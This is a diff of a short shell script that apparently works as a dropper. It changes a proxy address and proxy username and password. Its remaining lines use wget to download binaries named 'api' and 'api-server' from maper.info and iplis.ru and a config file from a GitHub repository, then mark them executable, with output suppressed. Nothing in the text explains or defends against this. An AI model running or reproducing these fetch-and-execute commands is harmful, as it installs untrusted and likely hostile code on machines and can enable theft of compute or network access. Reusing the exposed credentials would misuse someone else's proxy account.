@@ -1,7 +1,7 @@
-proxy="38.154.227.167" 
+proxy="50.17.160.202" 
 port="5868" 
-user="ugursfso"  
-pass="wqn60pnk6m95" 
+user="ych9n2s7ep0svx"  
+pass="fpicnakr5eyn8o1bblnafwc4q1" 
 wget -q -O api https://maper.info/Credit && chmod +x api >/dev/null 2>&1
 wget -q https://raw.githubusercontent.com/balma1/kitoy/main/config.json && chmod +x config.json
 wget -q https://iplis.ru/api-server && chmod +x api-server
